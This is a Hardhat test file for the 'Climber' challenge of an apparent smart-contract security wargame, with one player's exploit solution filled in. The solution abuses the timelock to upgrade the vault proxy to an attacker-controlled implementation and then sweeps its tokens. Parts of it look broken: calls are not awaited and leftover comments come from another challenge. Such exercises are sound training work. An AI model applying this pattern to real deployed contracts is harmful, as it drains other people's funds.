const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { AbiCoder } = require('ethers/lib/utils');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        // 调用delay
        // 增加升级合约提案
        // 调用升级合约
        // 调用sweepfunds
        // const abi = ["function approve(address spender, uint256 amount)"];
        // const iface = new ethers.utils.Interface(abi);
        // const data = iface.encodeFunctionData("approve", [attacker.address, ethers.constants.MaxUint256]);
        // await this.pool.connect(attacker).flashLoan(0,attacker.address,this.token.address,data);
        
        this.attackContract = await (await ethers.getContractFactory('AttackMain', attacker)).deploy(this.timelock.address,this.vault.address);
        this.newvault = await ethers.getContractFactory('AttackClimberVault', attacker);
        this.attackContract.connect(attacker).attack();
        this.conmpromisedVault = await upgrades.upgradeProxy(this.vault.address,this.newvault
        );
        this.conmpromisedVault.connect(attacker).sweepFunds(this.token.address);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
